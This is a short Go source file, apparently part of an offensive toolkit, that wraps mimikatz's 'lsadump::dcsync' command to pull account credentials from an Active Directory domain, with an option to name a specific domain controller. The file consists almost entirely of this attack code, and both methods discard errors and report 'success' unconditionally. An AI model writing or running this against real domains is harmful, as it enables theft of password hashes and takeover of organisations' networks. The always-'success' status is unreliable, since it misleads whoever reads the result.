package kerberos

import "os/exec"

type DCSyncResult struct {
Domain string
User   string
Status string
}

type DCSync struct {
Domain string
User   string
Target string
}

func (d DCSync) Extract() DCSyncResult {
cmd := exec.Command("mimikatz.exe", "lsadump::dcsync", "/domain:"+d.Domain, "/user:"+d.User)
cmd.Run()
return DCSyncResult{Domain: d.Domain, User: d.User, Status: "success"}
}

func (d DCSync) ExtractWithTarget() DCSyncResult {
cmd := exec.Command("mimikatz.exe", "lsadump::dcsync", "/domain:"+d.Domain, "/user:"+d.User, "/dc:"+d.Target)
cmd.Run()
return DCSyncResult{Domain: d.Domain, User: d.User, Status: "success"}
}
